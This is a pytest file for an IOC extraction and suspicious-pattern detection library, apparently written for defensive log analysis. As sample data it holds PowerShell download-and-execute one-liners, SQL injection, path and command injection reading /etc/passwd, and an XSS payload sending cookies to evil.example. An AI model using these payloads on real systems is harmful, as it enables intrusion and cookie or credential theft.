from ioc.extractor import detect_suspicious, extract_iocs
from ioc.validator import validate_domain, validate_hash, validate_ipv4, validate_ipv6, validate_url


def types_of(items):
    return {i["type"] for i in items}


def values_of(items):
    return {i["value"] for i in items}


# ---------- validators ----------

def test_ipv4_valid_public_private():
    pub = validate_ipv4("185.23.45.67")
    assert pub and pub["private"] is False and pub["type"] == "ipv4"
    priv = validate_ipv4("192.168.1.25")
    assert priv and priv["private"] is True


def test_ipv4_invalid_rejected():
    assert validate_ipv4("999.888.777.1") is None
    assert validate_ipv4("1.2.3") is None
    assert validate_ipv4("abc.def.ghi.jkl") is None


def test_ipv6_full_and_compressed():
    full = validate_ipv6("2001:0db8:85a3:0000:0000:8a2e:0370:7334")
    comp = validate_ipv6("::1")
    assert full and full["type"] == "ipv6"
    assert comp and comp["value"] == "::1"


def test_domain_valid_and_filename_excluded():
    assert validate_domain("evil.example.com")
    assert validate_domain("malware-site.tk")
    # file names must not be treated as domains
    assert validate_domain("access.log") is None
    assert validate_domain("config.yaml") is None
    assert validate_domain("backup-2026.tar") is None


def test_url_with_path_query():
    u = validate_url("http://185.23.45.67/payload/x.sh?cmd=1")
    assert u and u["type"] == "url" and u["host"] == "185.23.45.67"


def test_url_invalid_scheme_rejected():
    assert validate_url("ftp://files.example.com/x") is None
    assert validate_url("not a url") is None


def test_hashes_by_length():
    md5 = validate_hash("5d41402abc4b2a76b9719d911017c592")
    sha1 = validate_hash("a9993e364706816aba3e25717850c26c9cd0d89d")
    sha256 = validate_hash("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")
    assert md5["type"] == "md5" and sha1["type"] == "sha1" and sha256["type"] == "sha256"
    assert validate_hash("tooshort123") is None
    assert validate_hash("z" * 32) is None


# ---------- extraction ----------

def test_extract_mixed_text():
    text = ("Bruteforce from 185.23.45.67 via http://185.23.45.67/panel "
            "payload 5d41402abc4b2a76b9719d911017c592 domain evil.example.com")
    items = extract_iocs(text)
    vals = values_of(items)
    assert "185.23.45.67" in vals
    assert "http://185.23.45.67/panel" in vals
    assert "evil.example.com" in vals
    assert "5d41402abc4b2a76b9719d911017c592" in vals
    t = types_of([i for i in items if i["value"] in vals])
    assert {"ipv4", "url", "domain", "md5"} <= t


def test_dedup_same_value():
    items = extract_iocs("10.0.0.5 10.0.0.5 http://10.0.0.5/a")
    ipv4_count = sum(1 for i in items if i["value"] == "10.0.0.5" and i["type"] == "ipv4")
    assert ipv4_count == 1


def test_version_number_suppressed():
    items = extract_iocs("app version 1.2.3.4 started fine")
    assert "1.2.3.4" not in values_of(items)


def test_reserved_ips_suppressed():
    assert "127.0.0.1" not in values_of(extract_iocs("localhost 127.0.0.1 hit"))
    assert "0.0.0.0" not in values_of(extract_iocs("bind 0.0.0.0"))


def test_email_not_domain():
    items = extract_iocs("contact amaan@example.com for access")
    doms = [i for i in items if i["type"] == "domain"]
    assert all(not i["value"].startswith("amaan@") for i in doms)


def test_suspicious_patterns_flagged():
    cases = {
        "powershell -EncodedCommand SQBFAFgA": "encoded_powershell",
        "$w.DownloadString('http://x/y.ps1')": "download_command",
        "iex(new-object net.webclient).downloadstring('http://x')": "powershell_iex",
        "/bin/bash -c 'curl http://x'": "shell_execution",
        "GET /../../etc/passwd": "path_traversal",
        "id=1 UNION SELECT username,password FROM users--": "sql_injection",
        "<script>alert(1)</script>": "xss_pattern",
        "; cat /etc/passwd": "command_injection",
    }
    for text, expected in cases.items():
        flags = detect_suspicious(text)
        assert expected in flags, f"{expected} not flagged in: {text}"


def test_clean_text_no_flags():
    assert detect_suspicious("GET /index.html 200 ok normal browsing") == []


def test_http_path_not_mined_as_domain():
    items = extract_iocs("GET /products.php?id=1 HTTP/1.1")
    assert types_of(items) <= {"url"}  # at most nothing useful; never fake domains
    assert "products.php" not in values_of(items)


def test_xss_payload_yields_real_iocs_only():
    text = "<script>document.location='http://evil.example/?c='+document.cookie</script>"
    vals = values_of(extract_iocs(text))
    assert "http://evil.example/?c='+document.cookie" not in vals
    assert any(v.startswith("http") for v in vals)
    assert "evil.example" in vals
    assert not any(v.startswith("document.") for v in vals)
